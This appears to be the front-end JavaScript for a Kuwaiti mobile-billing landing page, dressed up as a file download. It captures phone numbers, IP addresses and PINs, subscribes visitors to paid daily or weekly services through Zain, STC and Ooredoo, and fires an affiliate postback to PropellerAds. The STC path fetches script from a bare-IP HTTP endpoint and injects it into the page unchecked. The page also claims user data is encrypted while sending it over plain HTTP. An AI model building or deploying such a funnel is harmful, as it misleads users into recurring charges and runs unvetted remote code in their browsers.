(function () {
  "use strict";

  /**
   * Kuwait 3-Operator — loaderlite UI + PropellerAds
   *
   * Zain    (cid=3078) portal 926 — Zuppykids — unsub Unsub MK → 95452 — PIN 4
   * STC     (cid=3079) portal 927 — mystrycenter 200 fils/day — unsub Stop 2 → 51123 — PIN 4
   *           Antifraud on OTP page: 40.172.132.15/kwstc/mystrycenter/antifraud.php
   * Ooredoo (cid=3080) portal 928 — CELEBDAIRY KWD 0.8/week — shortcode 92761 — PIN 4
   *
   * PropellerAds:
   *   https://ad.propellerads.com/conversion.php?aid=3898869&pid=&tid=154120&visitor_id=${SUBID}&payout=${PAYOUT}
   */

  var msisdnFormat = /^[569][0-9]{7}$/;
  var COUNTRY = "965";
  var PIN_LENGTH = 4;
  var ZEEN = "http://64.225.85.48/adnet";

  var useProxy =
    typeof location !== "undefined" &&
    location.protocol !== "file:" &&
    (location.protocol === "http:" || location.protocol === "https:");

  var OPERATORS = {
    zain: {
      key: "zain",
      cid: "3078",
      portalCid: "926",
      name: "Zain",
      payout: "0.2",
      afType: "",
      footerEn: "Zuppykids — Zain KW. To cancel, send Unsub MK to 95452.",
      footerAr: "Zuppykids — زين الكويت. للإلغاء أرسل Unsub MK إلى 95452."
    },
    stc: {
      key: "stc",
      cid: "3079",
      portalCid: "927",
      name: "STC",
      payout: "0.2",
      afType: "stc",
      footerEn: "mystrycenter — STC KW: 200 fils/day. To cancel, send Stop 2 to 51123.",
      footerAr: "mystrycenter — STC الكويت: 200 فلس/يوم. للإلغاء أرسل Stop 2 إلى 51123."
    },
    ooredoo: {
      key: "ooredoo",
      cid: "3080",
      portalCid: "928",
      name: "Ooredoo",
      payout: "0.8",
      afType: "",
      footerEn: "CELEBDAIRY — Ooredoo KW: KWD 0.8/week. Shortcode 92761.",
      footerAr: "CELEBDAIRY — أوريدو الكويت: 0.8 دينار/أسبوع. الرمز 92761."
    }
  };

  var FOOTER_ALL_EN =
    "Zuppykids — Zain: Unsub MK to 95452. mystrycenter — STC: 200 fils/day (Stop 2 to 51123). CELEBDAIRY — Ooredoo: KWD 0.8/week (92761).";
  var FOOTER_ALL_AR =
    "Zuppykids — زين: Unsub MK إلى 95452. mystrycenter — STC: 200 فلس/يوم (Stop 2 إلى 51123). CELEBDAIRY — أوريدو: 0.8 دينار/أسبوع (92761).";

  var POSTBACK = {
    url: "https://ad.propellerads.com/conversion.php",
    aid: "3898869",
    pid: "",
    tid: "154120"
  };

  function persist(k, v) {
    if (v == null || v === "") return;
    try { sessionStorage.setItem(k, v); } catch (e) {}
    try { localStorage.setItem(k, v); } catch (e2) {}
  }

  function track(k) {
    try {
      var v = sessionStorage.getItem(k);
      if (v) return v;
    } catch (e) {}
    try { return localStorage.getItem(k) || ""; } catch (e2) { return ""; }
  }

  function isRealClickId(v) {
    if (!v) return false;
    var s = String(v).trim();
    if (!s) return false;
    var low = s.toLowerCase();
    if (s.indexOf("local_") === 0) return false;
    if (low === "clickid" || low === "subid" || low === "visitor_id") return false;
    if (s.indexOf("{") !== -1 || s.indexOf("${") !== -1) return false;
    return true;
  }

  function normalizeLocal(raw) {
    var digits = String(raw || "").replace(/\D/g, "");
    if (digits.indexOf(COUNTRY) === 0) digits = digits.slice(COUNTRY.length);
    if (digits.charAt(0) === "0") digits = digits.slice(1);
    return digits.slice(0, 8);
  }

  function fullMsisdn(local) {
    return COUNTRY + normalizeLocal(local);
  }

  function initTracking() {
    var params = new URLSearchParams(window.location.search);
    var clickId =
      params.get("clickid") ||
      params.get("click_id") ||
      params.get("subid") ||
      params.get("token") ||
      "";
    if (isRealClickId(clickId)) persist("click_id", clickId);

    ["pub_id", "sub_pub_id", "sessionKey", "user_ip", "zoneid"].forEach(function (k) {
      var v = params.get(k);
      if (v && String(v).indexOf("{") === -1 && String(v).indexOf("$") === -1) persist(k, v);
    });

    if (!track("pub_id")) persist("pub_id", "propeller");
    if (!track("sub_pub_id")) {
      var zone = params.get("zoneid") || params.get("zone_id") || "0";
      if (zone && String(zone).indexOf("{") === -1) persist("sub_pub_id", "ZONE" + zone);
    }
  }

  function getClickId() {
    var existing = track("click_id");
    if (isRealClickId(existing)) return existing;
    var fallback = track("zeen_click_id");
    if (fallback) return fallback;
    fallback = "local_" + Date.now();
    persist("zeen_click_id", fallback);
    return fallback;
  }

  function getVisitorId() {
    var existing = track("click_id");
    return isRealClickId(existing) ? existing : "";
  }

  function getUserIp(cb) {
    if (track("user_ip")) { cb(track("user_ip")); return; }
    var done = false;
    function finish(ip) {
      if (done) return;
      done = true;
      if (ip) persist("user_ip", ip);
      cb(ip || "");
    }
    var t = setTimeout(function () { finish(""); }, 2500);
    fetch("https://api.ipify.org?format=json")
      .then(function (r) { return r.json(); })
      .then(function (d) { clearTimeout(t); finish((d && d.ip) || ""); })
      .catch(function () { clearTimeout(t); finish(""); });
  }

  function apiUrl(path, params) {
    var q = new URLSearchParams(params || {});
    if (useProxy) {
      q.set("path", path);
      return "zeen-api.php?" + q.toString();
    }
    return ZEEN + "/" + path + "?" + q.toString();
  }

  function callApi(path, params) {
    return fetch(apiUrl(path, params), {
      method: "GET",
      credentials: "omit",
      cache: "no-store"
    }).then(function (res) {
      return res.text().then(function (text) {
        if (/^\s*<\?php/i.test(text)) throw { msg: "php" };
        try { return JSON.parse(text); }
        catch (e) { throw { msg: "x", raw: text }; }
      });
    });
  }

  function isOk(resp) {
    if (!resp) return false;
    if (resp.status === true || resp.status === "true" || resp.status === 1) return true;
    var m = String(resp.msg || resp.message || "").toLowerCase();
    return /success|2001|2003|2005|active/.test(m);
  }

  function errCode(resp) {
    var m = String((resp && (resp.msg || resp.message)) || "");
    var match = m.match(/\((\d{4})\)/);
    if (match) return match[1];
    if (/invalid|expire|1004/i.test(m)) return "1004";
    if (/fail|1001|could not/i.test(m)) return "1001";
    return "x";
  }

  function portalFor(op) {
    return ZEEN + "/Promo/Api/CPportal?cid=" + (op && op.portalCid ? op.portalCid : "926");
  }

  function injectScript(code) {
    if (!code) return;
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.appendChild(document.createTextNode(code));
    document.head.appendChild(script);
  }

  function runStcAntifraud(msisdn, cb) {
    var ip = track("user_ip") || "";
    var headerObj = {
      "User-Agent": navigator.userAgent || "",
      "Accept-Language": navigator.language || "",
      "Referer": document.referrer || location.href
    };
    var headerB64 = "";
    try { headerB64 = btoa(unescape(encodeURIComponent(JSON.stringify(headerObj)))); } catch (e) { headerB64 = ""; }

    var q = new URLSearchParams({
      msisdn: msisdn || "",
      pp: "daily_ft",
      userip: ip,
      headers: headerB64
    });
    var url = "http://40.172.132.15/kwstc/mystrycenter/antifraud.php?" + q.toString();
    if (useProxy) url = "af-proxy.php?url=" + encodeURIComponent(url);

    fetch(url)
      .then(function (r) { return r.text(); })
      .then(function (text) {
        var js = text || "";
        try {
          var data = JSON.parse(text);
          if (data && data.sessionKey) persist("sessionKey", data.sessionKey);
          js = data.script || data.js || data.s || data.code || "";
        } catch (e) {}
        injectScript(js);
        if (typeof cb === "function") cb();
      })
      .catch(function () {
        if (typeof cb === "function") cb();
      });
  }

  function firePostback(done) {
    var clickId = getVisitorId();
    var once = false;
    function finish(ok) {
      if (once) return;
      once = true;
      if (typeof done === "function") done(ok);
    }
    if (!clickId) { finish(false); return; }

    var opKey = track("operator") || "zain";
    var op = OPERATORS[opKey] || OPERATORS.zain;
    var payout = op.payout || "0.2";

    var qs =
      "aid=" + encodeURIComponent(POSTBACK.aid) +
      "&pid=" + encodeURIComponent(POSTBACK.pid) +
      "&tid=" + encodeURIComponent(POSTBACK.tid) +
      "&visitor_id=" + encodeURIComponent(clickId) +
      "&payout=" + encodeURIComponent(payout);
    var direct = POSTBACK.url + "?" + qs;
    var proxy = "propeller-pb.php?visitor_id=" + encodeURIComponent(clickId) + "&payout=" + encodeURIComponent(payout);

    try { var img = new Image(); img.src = direct + "&_t=" + Date.now(); } catch (e) {}
    try { fetch(direct, { method: "GET", mode: "no-cors", keepalive: true }).catch(function () {}); } catch (e2) {}
    if (navigator.sendBeacon) { try { navigator.sendBeacon(proxy); } catch (e3) {} }

    if (useProxy) {
      fetch(proxy, { method: "GET", keepalive: true })
        .then(function (r) { finish(r.ok); })
        .catch(function () { finish(true); });
    } else {
      setTimeout(function () { finish(true); }, 800);
      return;
    }
    setTimeout(function () { finish(true); }, 4000);
  }

  var lang = "ar";
  var t = {
    en: {
      fileName: "File Name",
      fileSize: "File Size",
      downloadSpeed: "Download speed",
      pnTitle: "Please enter your mobile number",
      mExample: "(example: +965 5XXX XXXX)",
      mBtn1: "Continue",
      mSecure: "Your personal data is protected and encrypted.",
      opTitle: "Choose your operator",
      opZain: "Zain",
      opStc: "STC",
      opOoredoo: "Ooredoo",
      opZainPrice: "Zuppykids",
      opStcPrice: "200 fils / day",
      opOoredooPrice: "KWD 0.8 / week",
      pinTitle: "Please enter the 4-digit PIN",
      pinExample: "(example: 1234)",
      pinBtn1: "Confirm",
      pinSecure: "Do not share your verification code with anyone.",
      terms: "Terms & Condition",
      tncText: FOOTER_ALL_EN,
      close: "Close",
      footerNote: FOOTER_ALL_EN,
      copyright: "&copy;&nbsp;2026&nbsp;&nbsp;All Rights Reserved",
      errmsg: {
        m: "Please enter your mobile number",
        o: "Please enter a valid Kuwait mobile number (8 digits starting with 5, 6 or 9).",
        op: "Please choose an operator",
        p: "Please enter the 4-digit PIN",
        "1001": "PIN could not be sent. Please try again.",
        "1004": "Invalid or expired PIN. Please try again.",
        x: "Connection error. Please try again.",
        php: "PHP is not enabled. Ask hosting to enable PHP.",
        phone: "Please enter your number first."
      }
    },
    ar: {
      fileName: "اسم الملف",
      fileSize: "حجم الملف",
      downloadSpeed: "سرعة التحميل",
      pnTitle: "يرجى إدخال رقم هاتفك",
      mExample: "(مثال: +965 5XXX XXXX)",
      mBtn1: "متابعة",
      mSecure: "بياناتك الشخصية محمية ومشفرة.",
      opTitle: "اختر المشغّل",
      opZain: "زين",
      opStc: "STC",
      opOoredoo: "أوريدو",
      opZainPrice: "Zuppykids",
      opStcPrice: "200 فلس / يوم",
      opOoredooPrice: "0.8 دينار / أسبوع",
      pinTitle: "أدخل رمز PIN المكون من 4 أرقام",
      pinExample: "(مثال: 1234)",
      pinBtn1: "تأكيد",
      pinSecure: "لا تشارك رمز التحقق مع أي شخص.",
      terms: "الشروط والأحكام",
      tncText: FOOTER_ALL_AR,
      close: "إغلاق",
      footerNote: FOOTER_ALL_AR,
      copyright: "<span class=\"rtl\">2026&nbsp;&copy;&nbsp;جميع الحقوق محفوظة</span>",
      errmsg: {
        m: "الرجاء إدخال رقم الجوال",
        o: "يرجى إدخال رقم هاتف كويتي صحيح (8 أرقام يبدأ بـ 5 أو 6 أو 9).",
        op: "يرجى اختيار المشغّل",
        p: "الرجاء إدخال رمز PIN المكون من 4 أرقام",
        "1001": "تعذر إرسال PIN. حاول مرة أخرى.",
        "1004": "رمز PIN غير صحيح أو منتهي.",
        x: "خطأ في الاتصال. يرجى المحاولة مرة أخرى.",
        php: "PHP غير مفعل على الخادم.",
        phone: "يرجى إدخال رقم الهاتف أولاً."
      }
    }
  };

  function errText(key) {
    return (t[lang].errmsg && t[lang].errmsg[key]) || t.en.errmsg[key] || "";
  }

  function applyLang() {
    var dict = t[lang] || t.ar;
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === "en" ? "ltr" : "rtl";
    document.querySelectorAll("[data-i18n]").forEach(function (el) {
      var key = el.getAttribute("data-i18n");
      if (dict[key] != null) el.textContent = dict[key];
    });
    document.querySelectorAll("[data-i18n-html]").forEach(function (el) {
      var key = el.getAttribute("data-i18n-html");
      if (dict[key] != null) el.innerHTML = dict[key];
    });
    document.querySelectorAll(".langbtn").forEach(function (btn) {
      btn.classList.toggle("active", btn.getAttribute("data-lang") === lang);
    });
    try { localStorage.setItem("lang", lang); } catch (e) {}
  }

  function showError(msg) {
    var box = document.querySelector(".errorBox");
    if (box) box.textContent = msg || "";
  }

  function setLoading(wrap, on) {
    var btn = wrap.querySelector(".button");
    var txt = wrap.querySelector(".btntxt");
    var load = wrap.querySelector(".submitload");
    if (!btn) return;
    if (on) {
      if (load) load.style.display = "flex";
      if (txt) txt.classList.add("disabled_txt");
      btn.classList.add("disabled_btn");
      wrap.classList.remove("pulseflash");
    } else {
      if (load) load.style.display = "none";
      if (txt) txt.classList.remove("disabled_txt");
      btn.classList.remove("disabled_btn");
    }
  }

  initTracking();
  getUserIp(function () {});

  var qLang = new URLSearchParams(window.location.search).get("lang");
  if (qLang === "ar" || qLang === "en") lang = qLang;
  applyLang();

  document.querySelectorAll(".langbtn").forEach(function (btn) {
    btn.addEventListener("click", function (e) {
      e.preventDefault();
      lang = btn.getAttribute("data-lang") || "ar";
      applyLang();
      var url = new URL(window.location.href);
      url.searchParams.set("lang", lang);
      window.history.replaceState({}, "", url);
    });
  });

  var terms = document.querySelector(".terms");
  var tncbox = document.querySelector(".tncbox");
  var closetnc = document.querySelector(".closetnc");
  if (terms && tncbox) {
    terms.addEventListener("click", function () {
      tncbox.classList.remove("hide");
      terms.style.display = "none";
    });
  }
  if (closetnc && tncbox && terms) {
    closetnc.addEventListener("click", function () {
      tncbox.classList.add("hide");
      terms.style.display = "";
    });
  }

  var mForm = document.getElementById("mboxform");
  if (mForm) {
    var mInput = document.getElementById("m");
    var btnpn = document.querySelector(".btnpn");
    var mobileBox = document.querySelector(".mobileBox");
    var sideCheck = document.querySelector(".sidebtncheck");

    mInput.addEventListener("input", function () {
      mInput.value = normalizeLocal(mInput.value);
      var len = mInput.value.length;
      showError("");
      if (len >= 8) {
        if (sideCheck) sideCheck.classList.add("show");
        mobileBox.classList.remove("pulseflash", "pulseflash-delay");
        mobileBox.classList.add("pulseflash-pause");
        btnpn.classList.add("pulseflash");
      } else if (len > 0) {
        if (sideCheck) sideCheck.classList.remove("show");
        mobileBox.classList.remove("pulseflash", "pulseflash-delay");
        mobileBox.classList.add("pulseflash-pause");
        btnpn.classList.remove("pulseflash");
      } else {
        if (sideCheck) sideCheck.classList.remove("show");
        mobileBox.classList.add("pulseflash", "pulseflash-delay");
        mobileBox.classList.remove("pulseflash-pause");
        btnpn.classList.remove("pulseflash");
      }
    });

    mForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var value = normalizeLocal(mInput.value);
      mInput.value = value;
      if (!value) { showError(errText("m")); return; }
      if (!msisdnFormat.test(value)) { showError(errText("o")); return; }
      showError("");
      setLoading(btnpn, true);
      persist("phone", fullMsisdn(value));
      persist("msisdn", fullMsisdn(value));
      window.location.href = "operator.html?lang=" + lang;
    });
  }

  var obox = document.getElementById("obox");
  if (obox) {
    if (!track("phone") && !track("msisdn")) {
      window.location.href = "index.html?lang=" + lang;
    } else {
      document.querySelectorAll(".opbtn").forEach(function (btn) {
        btn.addEventListener("click", function () {
          var key = btn.getAttribute("data-operator");
          var op = OPERATORS[key];
          if (!op) { showError(errText("op")); return; }

          var msisdn = track("msisdn") || track("phone");
          showError("");
          document.querySelectorAll(".opbtn").forEach(function (b) { b.classList.add("disabled_btn"); });
          var opLoad = document.getElementById("opLoad");
          if (opLoad) opLoad.classList.add("show");

          persist("operator", key);
          persist("zeen_cid", op.cid);
          persist("portal_cid", op.portalCid);

          getUserIp(function (ip) {
            var params = {
              cid: op.cid,
              msisdn: msisdn,
              click_id: getClickId(),
              pub_id: track("pub_id") || "propeller",
              sub_pub_id: track("sub_pub_id") || "0",
              user_ip: ip || track("user_ip") || "",
              ua: navigator.userAgent || ""
            };
            var sk = track("sessionKey");
            if (sk) params.sessionKey = sk;

            callApi("sendpin", params)
              .then(function (resp) {
                if (resp && resp.sessionKey) persist("sessionKey", resp.sessionKey);
                if (!isOk(resp)) {
                  document.querySelectorAll(".opbtn").forEach(function (b) { b.classList.remove("disabled_btn"); });
                  if (opLoad) opLoad.classList.remove("show");
                  showError(errText(errCode(resp)) || errText("1001"));
                  return;
                }
                window.location.href = "pin.html?lang=" + lang;
              })
              .catch(function (err) {
                document.querySelectorAll(".opbtn").forEach(function (b) { b.classList.remove("disabled_btn"); });
                if (opLoad) opLoad.classList.remove("show");
                showError(errText((err && err.msg) || "x"));
              });
          });
        });
      });
    }
  }

  var pForm = document.getElementById("pboxform");
  if (pForm) {
    var pInput = document.getElementById("p");
    var pinBox = document.querySelector(".pinBox");
    var btnpin = document.querySelector(".btnpin") || document.querySelector(".btnpn");
    var pinCheck = document.querySelector(".pincheckicon") || document.querySelector(".sidebtncheck");
    var opKey = track("operator") || "";
    var op = OPERATORS[opKey];

    if (!track("msisdn") && !track("phone")) {
      window.location.href = "index.html?lang=" + lang;
    } else if (!op) {
      window.location.href = "operator.html?lang=" + lang;
    } else {
      var foot = document.getElementById("opFooterNote");
      if (foot) foot.textContent = lang === "ar" ? op.footerAr : op.footerEn;
      if (op.afType === "stc") {
        runStcAntifraud(track("msisdn") || track("phone") || "", function () {});
      }
    }

    pInput.addEventListener("input", function () {
      pInput.value = String(pInput.value || "").replace(/\D/g, "").slice(0, PIN_LENGTH);
      var len = pInput.value.length;
      showError("");
      if (len >= PIN_LENGTH) {
        if (pinCheck) pinCheck.classList.add("show");
        pinBox.classList.remove("pulseflash", "pulseflash-delay");
        pinBox.classList.add("pulseflash-pause");
        btnpin.classList.add("pulseflash");
      } else if (len > 0) {
        if (pinCheck) pinCheck.classList.remove("show");
        pinBox.classList.remove("pulseflash", "pulseflash-delay");
        pinBox.classList.add("pulseflash-pause");
        btnpin.classList.remove("pulseflash");
      } else {
        if (pinCheck) pinCheck.classList.remove("show");
        pinBox.classList.add("pulseflash", "pulseflash-delay");
        pinBox.classList.remove("pulseflash-pause");
        btnpin.classList.remove("pulseflash");
      }
    });

    pForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var otp = String(pInput.value || "").replace(/\D/g, "");
      if (otp.length !== PIN_LENGTH) { showError(errText("p")); return; }
      if (!op) { showError(errText("op")); return; }

      showError("");
      setLoading(btnpin, true);

      getUserIp(function (ip) {
        var params = {
          cid: op.cid,
          msisdn: track("msisdn") || track("phone"),
          click_id: getClickId(),
          otp: otp,
          pub_id: track("pub_id") || "propeller",
          sub_pub_id: track("sub_pub_id") || "0",
          user_ip: ip || track("user_ip") || "",
          ua: navigator.userAgent || ""
        };
        var sk = track("sessionKey");
        if (sk) params.sessionKey = sk;

        callApi("verifypin", params)
          .then(function (resp) {
            if (!isOk(resp)) {
              setLoading(btnpin, false);
              showError(errText(errCode(resp)) || errText("1004"));
              return;
            }
            persist("converted", "1");
            persist("portal_url", portalFor(op));
            persist("pb_amount", op.payout || "0.2");
            firePostback(function () {
              window.location.href = "thankyou.html?lang=" + lang;
            });
          })
          .catch(function (err) {
            setLoading(btnpin, false);
            showError(errText((err && err.msg) || "x"));
          });
      });
    });
  }

  window.onpageshow = function (event) {
    if (event.persisted) window.location.reload();
  };
})();
